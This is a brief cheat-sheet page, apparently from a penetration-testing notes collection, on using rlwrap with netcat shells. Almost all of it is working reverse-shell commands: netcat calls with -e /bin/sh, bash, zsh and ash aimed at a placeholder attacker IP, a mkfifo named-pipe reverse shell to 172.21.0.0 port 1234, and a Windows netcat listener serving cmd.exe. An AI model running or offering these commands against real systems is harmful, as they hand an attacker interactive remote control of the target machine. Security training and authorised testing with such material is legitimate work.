# Rlwrap

## rlwrap

We can use rlwrap to enable better movement in an nc shell:

### Linux

```text
rlwrap nc [Your IP Address] -e /bin/sh
rlwrap nc [Your IP Address] -e /bin/bash
rlwrap nc [Your IP Address] -e /bin/zsh
rlwrap nc [Your IP Address] -e /bin/ash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|rlwrap nc 172.21.0.0 1234 >/tmp/f
```

### Windows

```text
rlwrap nc -lv [localport] -e cmd.exe
```

